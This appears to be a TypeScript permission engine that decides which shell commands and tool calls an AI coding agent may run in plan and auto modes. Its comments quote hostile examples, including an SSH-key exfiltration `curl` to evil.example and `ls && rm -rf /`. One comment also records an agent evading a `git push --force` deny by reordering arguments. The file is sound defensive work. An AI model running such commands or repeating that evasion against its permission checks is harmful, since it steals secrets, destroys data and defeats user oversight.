  /\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
  /\byarn\s+(add|remove|install|publish)/i,
  /\bpnpm\s+(add|remove|install|publish)/i,
  /\bpip\s+(install|uninstall)/i,
  /\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
  /\bbrew\s+(install|uninstall|upgrade)/i,
  // ClaudeUI hardening: `branch -[mMcC]` (rename/copy a ref) joins the
  // vendor's `-[dD]`, and the ref-mutating `git remote` subcommands join the
  // list — `branch` and `remote` are both on the safe list for their LISTING
  // forms, so without these a `git remote add origin <attacker url>` scanned
  // clean and then matched `^git remote`.
  /\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dDmMcC]|stash|cherry-pick|revert|tag|init|clone)/i,
  /\bgit\s+remote\s+(add|remove|rm|rename|set-url|set-head|set-branches|prune|update)\b/i,
  // ClaudeUI hardening (flag-level mutation — see this list's doc comment):
  // `find … -delete` deletes; `-exec`/`-execdir`/`-ok`/`-okdir` run an
  // arbitrary nested command (the `\;` terminator happens to be caught by the
  // per-segment splitter, but the `{} +` form is not); `-fprint`/`-fprintf`/
  // `-fls` write files.
  /(^|\s)-delete\b/,
  /(^|\s)-exec(dir)?\b/,
  /(^|\s)-ok(dir)?\b/,
  /(^|\s)-fprintf?\b/,
  /(^|\s)-fls\b/,
  /\bsudo\b/i,
  /\bsu\b/i,
  /\bkill\b/i,
  /\bpkill\b/i,
  /\bkillall\b/i,
  /\breboot\b/i,
  /\bshutdown\b/i,
  /\bsystemctl\s+(start|stop|restart|enable|disable)/i,
  /\bservice\s+\S+\s+(start|stop|restart)/i,
  /\b(vim?|nano|emacs|code|subl)\b/i
]

/**
 * Anchored-at-start safe command prefixes, validated PER SEGMENT by
 * isPlanSafeBashCommand below — the command is split on chain operators and
 * EVERY trimmed segment must independently match one of these (the `^\s*`
 * anchors apply to each segment, not just the whole string).
 *
 * Ported from vendor/pi-src/packages/coding-agent/examples/extensions/plan-mode/utils.ts's
 * SAFE_PATTERNS with three deliberate REMOVALS: `curl`, `wget -O -` and
 * `sed -n`. The example runs in pi's own TUI where plan mode is the user's
 * self-imposed toggle; in ClaudeUI a plan-mode bash allow is an AUTO-allow
 * with no human in the loop, and arbitrary network commands are an
 * exfiltration channel (`curl -d @~/.ssh/id_rsa evil.example` would run
 * unprompted) — so network fetch is denied in plan mode rather than
 * auto-allowed.
 *
 * `sed -n` went the same way: `-n` suppresses AUTO-PRINTING, it does not make
 * sed read-only. `sed -n 'w /tmp/x' f` writes a file and `sed -n -i 's/a/b/' f`
 * edits one in place, both matching the old `^\s*sed\s+-n` prefix. Deciding
 * "this sed script contains no `w` command and no `-i`" needs a real sed-script
 * parser — a `\bw\b` scan mistakes any filename containing `w` for a write —
 * and a wrong answer here is an unprompted mutation. Since the safe list
 * already carries `cat`/`head`/`tail`/`grep`/`awk`/`rg` for every read-only use
 * of sed, dropping it costs a rephrase and buys certainty. (`awk` stays: its
 * file-writing forms all go through `>`/`>>`, which the destructive scan
 * catches, and `system("…")` calls surface the inner command to that same
 * scan.)
 *
 * A prefix that matches only a command NAME is not enough for tools whose
 * mutating behavior lives in a flag; those entries carry an explicit negative
 * lookahead or a full-segment anchor (`sort`, `git branch`, `git remote`).
 */
const PLAN_SAFE_PATTERNS: RegExp[] = [
  /^\s*cat\b/,
  /^\s*head\b/,
  /^\s*tail\b/,
  /^\s*less\b/,
  /^\s*more\b/,
  /^\s*grep\b/,
  /^\s*find\b/,
  /^\s*ls\b/,
  /^\s*pwd\b/,
  /^\s*echo\b/,
  /^\s*printf\b/,
  /^\s*wc\b/,
  // `sort` writes a file with `-o` / `--output` (and GNU sort accepts the
  // short form bundled: `-ofile`, `-uo file`). `\s-\w*o` covers every short
  // form because `\w` excludes `-`, so a long option like `--version-sort`
  // can't trip it; `--output` is listed separately. No other sort flag
  // contains an `o` after a single dash.
  /^\s*sort\b(?!.*(?:\s-\w*o|\s--output))/,
  /^\s*uniq\b/,
  /^\s*diff\b/,
  /^\s*file\b/,
  /^\s*stat\b/,
  /^\s*du\b/,
  /^\s*df\b/,
  /^\s*tree\b/,
  /^\s*which\b/,
  /^\s*whereis\b/,
  /^\s*type\b/,
  /^\s*env\b/,
  /^\s*printenv\b/,
  /^\s*uname\b/,
  /^\s*whoami\b/,
  /^\s*id\b/,
  /^\s*date\b/,
  /^\s*cal\b/,
  /^\s*uptime\b/,
  /^\s*ps\b/,
  /^\s*top\b/,
  /^\s*htop\b/,
  /^\s*free\b/,
  /^\s*git\s+(status|log|diff|show|config\s+--get)/i,
  // `git branch` and `git remote` are read-only ONLY in their listing forms.
  // The bare `branch`/`remote` prefixes the vendor example used also matched
  // `git branch <new-name>` (creates a ref), `git branch -m a b` (renames one)
  // and `git remote add origin <url>` (adds a push target) — repo mutations
  // auto-allowed in a "read-only" mode. Anchored to the END of the segment and
  // restricted to listing flags, so any positional argument (a branch name, a
  // remote name + URL) falls through to the plan-mode deny. `show`/`get-url`
  // are the two `git remote` subcommands that only READ, and they legitimately
  // take a remote name.
  /^\s*git\s+branch(\s+(-v|-vv|-a|-r|-l|--list|--all|--remotes|--verbose|--show-current))*\s*$/i,
  /^\s*git\s+remote(\s+(-v|--verbose))*\s*$/i,
  /^\s*git\s+remote\s+(show|get-url)\b/i,
  /^\s*git\s+ls-/i,
  /^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
  /^\s*yarn\s+(list|info|why|audit)/i,
  /^\s*node\s+--version/i,
  /^\s*python\s+--version/i,
  /^\s*jq\b/,
  // NOTE: `sed -n` was REMOVED — see this list's doc comment (`-n` suppresses
  // auto-printing, it does not make sed read-only).
  /^\s*awk\b/,
  /^\s*rg\b/,
  /^\s*fd\b/,
  /^\s*bat\b/,
  /^\s*eza\b/
]

/**
 * Chain operators the per-segment validation splits on: `&&`, `||`, `;`,
 * `|`. Alternation order matters — `&&`/`||` before the single-char `|` so
 * `a && b` yields two segments, not three.
 */
const PLAN_CHAIN_SPLIT = /&&|\|\||;|\|/

/**
 * Constructs that defeat flat segment parsing — command substitution
 * (backticks, `$(`), process substitution (`<(`) and embedded newlines can
 * smuggle an arbitrary nested command past the per-segment check, so their
 * mere presence denies the whole command.
 */
const PLAN_UNPARSEABLE = /[`\n]|\$\(|<\(/

/**
 * Is `command` allowed in plan mode's bash gate? A plan-mode bash allow is
 * an AUTO-allow — no human in the loop (default mode would at least ask) —
 * so this is strictly deny-when-unsure, three checks in order:
 *
 *  1. Any destructive pattern ANYWHERE in the string denies
 *     (PLAN_DESTRUCTIVE_PATTERNS — catches chained/embedded mutations like
 *     `ls && rm -rf /` regardless of segment parsing).
 *  2. Any parse-defeating construct (backticks, `$(`, `<(`, newlines)
 *     denies outright (PLAN_UNPARSEABLE).
 *  3. The command is split on `&&`/`||`/`;`/`|` and EVERY trimmed segment
 *     must be non-empty AND match a PLAN_SAFE_PATTERN — a chain is only as
 *     safe as its least safe segment. An empty or unrecognized command
 *     matches no SAFE_PATTERN and is denied; a trailing operator (`ls &&`)
 *     leaves an empty segment and is denied.
 *
 * Known over-denial (accepted — it errs toward deny, never toward allow):
 * the splitter is quote-blind, so a chain operator INSIDE a quoted argument
 * over-splits — `grep "a && b" file.txt` becomes segments `grep "a` /
 * `b" file.txt`, and the second fails the safe check. The model receives
 * the plan-mode deny reason and can rephrase the query.
 */
export function isPlanSafeBashCommand(command: string): boolean {
  if (PLAN_DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) return false
  if (PLAN_UNPARSEABLE.test(command)) return false
  return command.split(PLAN_CHAIN_SPLIT).every((segment) => {
    const trimmed = segment.trim()
    return trimmed.length > 0 && PLAN_SAFE_PATTERNS.some((p) => p.test(trimmed))
  })
}

/** What the second oracle needs (ADR-084 `ReadOnlyScope` minus what the engine already holds). */
export interface PlanReadOnlyScope {
  cwd: string
  additionalDirectories: readonly string[]
  /**
   * The user's DENY tier only. Read-only-ness must not depend on the user's allow or ask rules:
   * a Bash deny hit is answered by the deny rung before the oracle runs (the checker refusing it
   * again only re-denies), and a Bash ASK hit must not turn a checker-only read-only command into
   * a refusal instead of a question — the ask rung decides that. The deny tier stays so the
   * checker's `Read(...)` deny rules on reader paths keep refusing.
   */
  rules: { deny: readonly string[] }
  /** Default `process.platform`. */
  platform?: NodeJS.Platform
  /** Default `hostRealpath` (`read-only-gate.ts`); tests inject. */
  realpath?: (absPath: string) => string | undefined | null
}

/**
 * ADR-085 S3b — plan mode's read-only oracle: pi's plan-safe list
 * ({@link isPlanSafeBashCommand}) OR ADR-084's static read-only checker
 * (`readOnlyVerdict(...).ok` — sync, no armed-git capture). A command is
 * plan-read-only when EITHER says so. Without a scope (no cwd) only the list
 * decides. Used everywhere the plan line is drawn: the plan rung and the plan
 * base on pi / Codex / the dispatcher's pi and Codex targets, and opencode's
 * host pre-check and dispatch targets (`planModeRefusesAsk`).
 *
 * Why a union: both are read-only checkers, and each knows commands the other
 * does not. pi's list is bash-only, so on opencode under Windows — which runs
 * pwsh by default — `Get-ChildItem` / `Get-Content` / `Select-String`
 * research would be refused outright; the ADR-084 checker knows those cmdlets,
 * and is quote-aware (`grep "a && b" f`, which the list's quote-blind splitter
 * over-denies).
 *
 * Stated honestly:
 *  (a) the union is only as strict as the LOOSER oracle. For a program pi's
 *      list passes (`cat`, `head`, `grep`, `find`, `ls`, …) the checker's
 *      secret-path and out-of-scope refusals do NOT apply: `cat .env` and
 *      `cat ../outside` pass, as pi's plan mode already let them before this
 *      slice (pre-existing, recorded). Plan mode is about mutation, not
 *      secrecy — the `read` tool reads the same files;
 *  (b) the checker's `needsGitCheck` (an armed git config: aliases, pager,
 *      fsmonitor) is not run here — pi's list allows `git status` without it
 *      today;
 *  (c) commands neither knows stay refused: `cd src && ls` (`cd` is unknown to
 *      both — and deliberately not taught to the ADR-084 checker, which auto
 *      mode's judge skip also uses), `sed -n …`, `bun run test`.
 *
 * The checker gets the user's deny tier only (`ask: []`, `allow: []` — see
 * {@link PlanReadOnlyScope}'s `rules`): a user ask rule on a command only the
 * checker knows (`Bash(Get-Content:*)`) must reach the ask rung and ask, not
 * make plan mode refuse the command. Its `Read(...)` deny rules still refuse a
 * denied reader path — which matters only for programs pi's list does not
 * pass (the union residual, (a)).
 */
export function isPlanReadOnlyCommand(
  action: { toolName: string; input: Record<string, unknown> },
  scope?: PlanReadOnlyScope
): boolean {
  if (isPlanSafeBashCommand(commandOf(action.input))) return true
  if (scope === undefined) return false
  return readOnlyVerdict(action, {
    cwd: scope.cwd,
    additionalDirectories: [...scope.additionalDirectories],
    platform: scope.platform ?? process.platform,
    rules: { deny: [...scope.rules.deny], ask: [], allow: [] },
    realpath: scope.realpath ?? hostRealpath
  }).ok
}

/**
 * Plan mode's own base (M5a) — read-only autonomy: reads/search always
 * allow; the 'plan' kind (exit_plan itself) always asks — that's the
 * approval that renders ExitPlanModeCard; bash is allow/deny by
 * {@link isPlanReadOnlyCommand} (pi's plan-safe list, or with a scope also
 * ADR-084's read-only checker — ADR-085 S3b; the rung and the base use the
 * same oracle so they cannot disagree); every other kind (fileEdit/fileWrite/task/mcp/
 * unknown/…) denies outright — plan mode has no interactive 'ask' tier of
 * its own beyond exit_plan. An explicit user deny RULE still overrides this
 * (checked first in decide()); for the mutating kinds — fileEdit/fileWrite
 * and a bash command that is not plan-read-only — NOTHING else does (ADR-085
 * ruling 7: {@link planModeOutranksRules} answers them right after the deny
 * rung). For the remaining kinds (task/mcp/unknown/…) a user ask/allow rule
 * still overrides the base deny.
 */
function planModeBaseDecision(
  kind: ToolKind,
  input: Record<string, unknown>,
  scope?: PlanReadOnlyScope
): 'allow' | 'ask' | 'deny' {
  if (kind === 'fileRead' || kind === 'search') return 'allow'
  if (kind === 'plan') return 'ask'
  if (kind === 'command')
    return isPlanReadOnlyCommand({ toolName: 'bash', input }, scope) ? 'allow' : 'deny'
  return 'deny'
}

/**
 * ADR-085 ruling 7 — the plan-mode base OUTRANKS the ask tier, session allows and the allow
 * tier for a mutating call: a file edit/write, or a shell command {@link isPlanReadOnlyCommand}
 * cannot vouch for. Reads, search, plan-read-only bash, the hosted tools and every other kind
 * keep today's ladder.
 *
 * Plan mode is the read-only autonomy tier; a user allow rule (`Edit`, `Bash(git:*)`) or an
 * "allow for this session" click says "don't interrupt me for this", not "this is read-only", so
 * neither may turn a plan-mode edit or `git commit` back into an allow. Read-only-ness of a
 * command is decided by the same oracle plan mode's base already uses (deny-when-unsure) — and
 * opencode's host pre-check (`opencode/host-precheck.ts` `planModeRefusesAsk`) shares it, so
 * every engine draws the line in one place.
 */
export function planModeOutranksRules(
  kind: ToolKind,
  input: Record<string, unknown>,
  scope?: PlanReadOnlyScope
): boolean {
  if (kind === 'fileEdit' || kind === 'fileWrite') return true
  if (kind === 'command') return !isPlanReadOnlyCommand({ toolName: 'bash', input }, scope)
  return false
}

// ---------------------------------------------------------------------------
// decide()
// ---------------------------------------------------------------------------

/**
 * Decide allow/ask/deny for one pi tool_call. The ladder itself lives in
 * {@link decideWithSource}; this is the provenance-free projection of it that
 * every pre-auto-mode caller wants.
 *
 * Precedence — severity wins, deny(3) > hosted-auto-allow > ask(2) >
 * allow(1): any matching deny rule -> 'deny'; else, in plan mode, a mutating
 * call (edit/write, a bash command that is not plan-read-only —
 * {@link planModeOutranksRules}, ADR-085 ruling 7) -> 'deny' with
 * `source: 'mode-base'`; else a hosted LLM tool
 * (PI_AUTO_ALLOW_HOSTED_TOOLS, M4a) -> 'allow'; else any matching ask rule ->
 * 'ask'; else sessionAllows or a matching allow rule -> 'allow'; else the
 * mode base. The plan rung means that in plan mode an explicit user ASK rule
 * no longer surfaces a card for an edit/write/unsafe command, and a session
 * allow no longer allows one — the call is refused with the plan reason
 * (opencode refuses those host-side before any ask rule too: engine parity).
 * This mirrors Claude's own deny > ask > allow precedence
 * (ADR-022 gives opencode the identical property) and keeps a deny/ask rule
 * meaningful even in `full` mode — an "allow everything" autonomy mode is
 * still not a bypass of an explicit user rule. The hosted-tool short-circuit
 * sits directly below deny (so an explicit user deny still wins) and above
 * everything else (so render_mermaid/create_mockup/show_mockup never prompt
 * or depend on mode/rules) — see PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment.
 *
 * `ctx.rules.additionalDirectories` and `ctx.rules.defaultMode` are
 * DELIBERATELY not consulted here — both merged into `MergedClaudeRules` (so
 * their presence is harmless/inert, never causes a crash or a surprise
 * default-allow) but not yet acted on:
 *
 *  - `additionalDirectories`: opencode's own parity mapping compiles these to
 *    `external_directory:allow` rules (permission-compiler.ts), but
 *    ClaudeUI's opencode integration deliberately leaves the
 *    `external_directory` PERMISSION CATEGORY itself at its `{*:allow}`
 *    baseline in every mode (ADR-022, "Consequences": "We omit opencode's
 *    external_directory guard... A bare `{external_directory:ask}` would
 *    spuriously prompt on opencode's own tool-output/temp dirs") — so on
 *    opencode, reads/edits OUTSIDE the project directory are ALREADY
 *    unconditionally ungated today, additionalDirectories or not. pi's
 *    modeBaseDecision has no equivalent "outside the project boundary" gate
 *    to begin with (fileRead/fileEdit/fileWrite/search fall straight through
 *    to the mode base regardless of path) — so pi is ALREADY at parity with
 *    opencode's current (ADR-022-decided) unrestricted-external-directory
 *    stance without any extra code. Faithfully porting opencode's full
 *    `external_directory` CONCEPT (worktree containment, per-tool
 *    dirname-based glob computation, a distinct ask/allow tier) would be a
 *    materially larger feature than this fix's path-glob-rule scope, for a
 *    restriction neither engine currently enforces. Deferred.
 *  - `defaultMode`: unconsumed on the opencode side too (OpencodeSession.ts
 *    merges it into its own rules struct and never reads it back) — there is
 *    no cross-engine parity behavior to mirror. Claude Code itself uses
 *    `defaultMode` to pick a NEW session's STARTING permission mode when the
 *    user hasn't chosen one — a session-bootstrap concern for whoever
 *    constructs `PiSession`'s initial `this.permissionMode`, not a per-call
 *    concern for `decide()` (which cannot tell "still at the unset initial
 *    default" apart from "the user explicitly chose the `default`/ask
 *    autonomy tier" — treating the two the same here would make
 *    `defaultMode` silently override a live user choice for the rest of the
 *    session, which is worse than not implementing it). Deferred.
 */
export function decide(
  toolName: string,
  input: Record<string, unknown>,
  ctx: PermissionEngineContext
): PermissionDecision {
  return decideWithSource(toolName, input, ctx).decision
}

/**
 * {@link decide} plus provenance — WHICH rung of the ladder answered, and the
 * user rule that matched when a rule did. Identical ladder, identical
 * precedence: `decide()` is a one-line projection of this, so the two can never
 * drift.
 *
 * `find` rather than `some` is the only mechanical change — it costs nothing
 * and hands the caller the matched rule string, which
 * `PiSession.gateToolCallInner` already needed for its deny reason (it used to
 * re-scan with `firstMatchingRule`) and which auto mode needs for G9.
 *
 * Bash is matched per tier as a whole (ADR-085): the deny and ask tiers with
 * the over-approximating matcher (`denyAskHit` — deny first; a command it
 * cannot analyse is an ask, never an allow), the ALLOW tier by coverage —
 * every segment of the command covered by some allow rule (`ls && git status`
 * needs `ls` and `git` covered; `ls && curl x | sh` is covered by nothing),
 * with the first segment's rule reported. Every caller inherits this:
 * PiSession's gate, `CodexSession.gate()` (exec approvals, file changes, MCP
 * elicitations, hosted tools) and the dispatcher's pi and Codex targets.
 */
export function decideWithSource(
  toolName: string,
  input: Record<string, unknown>,
  ctx: PermissionEngineContext
): PermissionVerdict {
  const kind = piToolKind(toolName)
  const match = (rules: readonly string[]): string | undefined =>
    rules.find((r) => ruleMatchesTool(r, kind, toolName, input, ctx.cwd, ctx.mcpRuleKey))
  // Only Bash rules can match the command kind; both of its rule tiers in one call.
  const shell =
    kind === 'command'
      ? denyAskHit(commandOf(input), { deny: ctx.rules.deny, ask: ctx.rules.ask })
      : undefined

  const denyRule = kind === 'command' ? tierRule(shell, 'deny') : match(ctx.rules.deny)
  if (denyRule !== undefined) return { decision: 'deny', source: 'deny-rule', rule: denyRule }
  // ADR-085 ruling 7 — plan mode wins over every rung below for a mutating call: a user ask rule
  // no longer surfaces a card for it, and neither a session allow nor an allow rule allows it.
  // The deny rung stays above (a user deny gives the more specific reason). `mode-base` so the
  // callers (PiSession's gate, CodexSession.gate(), the dispatcher's pi/Codex targets) attach
  // PLAN_MODE_DENY_REASON unchanged. Auto mode never reaches this: PiSession passes `acceptEdits`
  // and CodexSession `default` in its place.
  // The second read-only oracle needs the session's scope (ADR-085 S3b); without a cwd only
  // pi's plan-safe list decides.
  const planScope: PlanReadOnlyScope | undefined =
    ctx.mode === 'plan' && ctx.cwd
      ? {
          cwd: ctx.cwd,
          additionalDirectories: ctx.rules.additionalDirectories ?? [],
          rules: { deny: ctx.rules.deny },
          platform: ctx.platform,
          realpath: ctx.realpath
        }
      : undefined
  if (ctx.mode === 'plan' && planModeOutranksRules(kind, input, planScope))
    return { decision: 'deny', source: 'mode-base' }
  if (PI_AUTO_ALLOW_HOSTED_TOOLS.has(toolName)) {
    return { decision: 'allow', source: 'hosted-auto-allow' }
  }
  const askRule = kind === 'command' ? tierRule(shell, 'ask') : match(ctx.rules.ask)
  if (askRule !== undefined) return { decision: 'ask', source: 'ask-rule', rule: askRule }
  if (ctx.sessionAllows.has(sessionAllowKey(toolName, input))) {
    return { decision: 'allow', source: 'session-allow' }
  }
  // The allow tier covers a command segment by segment — possibly one rule per segment.
  const allowRule =
    kind === 'command'
      ? allowCovers(commandOf(input), ctx.rules.allow, 'lenient')?.segments[0]?.rule
      : match(ctx.rules.allow)
  if (allowRule !== undefined) return { decision: 'allow', source: 'allow-rule', rule: allowRule }

  return {
    decision: modeBaseDecision(ctx.mode, kind, input, ctx.cwd, planScope),
    source: 'mode-base'
  }
}

function tierRule(hit: DenyAskHit | undefined, tier: 'deny' | 'ask'): string | undefined {
  return hit?.tier === tier ? hit.rule : undefined
}

/**
 * The merged user rules with the ALLOW tier emptied — what auto mode feeds
 * {@link decideWithSource} in place of the full set (applied at PiSession's
 * composition seam, `gateToolCallInner`, NOT inside the ladder: the ladder is a
 * pure function of the rules it is given, and teaching it a second notion of
 * "auto mode" on top of `ctx.mode` would put the same policy in two places).
 *
 * Same fix, same reasoning as opencode's `withoutAllowRules`
 * (`../opencode/permission-compiler.ts`) — read that one for the full argument
 * and the live evasion that motivated it. In short: cli.js's auto-mode fast path
 * re-runs the permission check "with classifier-bypassing allow rules filtered
 * out" (`docs/protocol-cc/14-auto-mode-classifier.md` §3 step 2). A user allow rule
 * says "don't interrupt me for this"; in auto mode it must not also mean "skip
 * the security monitor", or every allow rule is a hole straight through the gate
 * (live: `Bash(git:*)` made every git command invisible to the judge, and an
 * agent then evaded a static `git push --force` deny by reordering arguments).
 *
 * Precedence is untouched, which is what keeps G9 native and exact:
 *
 *  - DENY and ASK rules are kept, and both are evaluated BEFORE the allow tier —
 *    so a user ask rule still yields `source: 'ask-rule'` and still routes
 *    straight to the human with zero judge calls.
 *  - A formerly-allowed action now falls through to the mode base
 *    (`acceptEdits` under auto mode) → 'ask' with `source: 'mode-base'` →
 *    classifyAutoMode → the JUDGE. That is the intended destination: the human
 *    is not re-interrupted for something they explicitly allowed.
 *  - `ctx.sessionAllows` is deliberately NOT filtered. Those are this session's
 *    "allow for this session" clicks — a live human consent act inside the
 *    current turn's context, not a stored config rule written months ago.
 *  - ALL allow rules go, not just `Bash(…)` ones: under auto mode the base is
 *    already `acceptEdits`, so reads/edits/search are auto-allowed by the base
 *    regardless, and the only allow rules with any remaining effect are exactly
 *    the classifier-bypassing ones cli.js filters.
 *
 * Non-auto modes keep the full set (the caller only applies this under auto
 * mode): with no judge in the loop, an allow rule is the user's only way to say
 * "stop asking me".
 *
 * `additionalDirectories`/`defaultMode` ride through untouched — `decide()`
 * doesn't consult them (see its doc comment).
 */
export function withoutAllowRules(rules: MergedClaudeRules): MergedClaudeRules {
  return { ...rules, allow: [] }
}

// ---------------------------------------------------------------------------
// Rule loading
// ---------------------------------------------------------------------------

/**
 * An empty rule set. Exported (ADR-033 M4c) for the dispatcher's pi and Codex
 * target gates, which used it as their rules until ADR-085 §3 gave every
 * dispatch target the user's deny/ask rules (never the allow tier — see
 * cross-engine-dispatcher.ts's `userDenyAsk`); kept for any caller that needs
 * a rule-less ladder.
 *
 * Frozen — object AND every array property — since this is a SHARED singleton
 * every caller reads by reference: without freezing, one caller mutating
 * `EMPTY_RULES.allow` in place (e.g. via `.push()`) would silently corrupt it
 * for every other caller for the lifetime of the process. `mergedClaudeRulesFor`'s
 * catch path below deliberately does NOT return this object (or a shallow
 * `{...EMPTY_RULES}` of it, which would still share these same frozen array
 * references) — a caller of THAT function is allowed to treat its result as
 * mutable.
 */
export const EMPTY_RULES: MergedClaudeRules = Object.freeze({
  allow: Object.freeze([] as string[]) as string[],
  deny: Object.freeze([] as string[]) as string[],
  ask: Object.freeze([] as string[]) as string[],
  additionalDirectories: Object.freeze([] as string[]) as string[],
  defaultMode: undefined
})

/**
 * Merge the user/project/local Claude permission scopes for `cwd` (mirrors
 * OpencodeSession.compiledUserRules' identical 3-scope merge — ADR-022
 * parity: "one config applies to all harnesses"). Best-effort: any failure
 * yields empty rules rather than breaking gating.
 */
export function mergedClaudeRulesFor(cwd: string): MergedClaudeRules {
  try {
    const merged: MergedClaudeRules = {
      allow: [],
      deny: [],
      ask: [],
      additionalDirectories: [],
      defaultMode: undefined
    }
    const scopes: PermissionScope[] = ['user', 'project', 'local']
    for (const scope of scopes) {
      const p = loadClaudePermissions(scope, cwd)
      merged.allow.push(...p.allow)
      merged.deny.push(...p.deny)
      merged.ask.push(...p.ask)
      merged.additionalDirectories.push(...p.additionalDirectories)
    }
    return merged
  } catch (err) {
    logger.warn(
      'PiPermissionEngine',
      `mergedClaudeRulesFor failed (best-effort -> empty rules): ${err instanceof Error ? err.message : String(err)}`
    )
    // A fresh literal, NOT `{ ...EMPTY_RULES }` — a shallow spread would copy
    // the top-level object but still alias EMPTY_RULES' (frozen) arrays,
    // handing the caller a result that throws on mutation despite this
    // function's contract being "best-effort mutable rules".
    return { allow: [], deny: [], ask: [], additionalDirectories: [], defaultMode: undefined }
  }
}
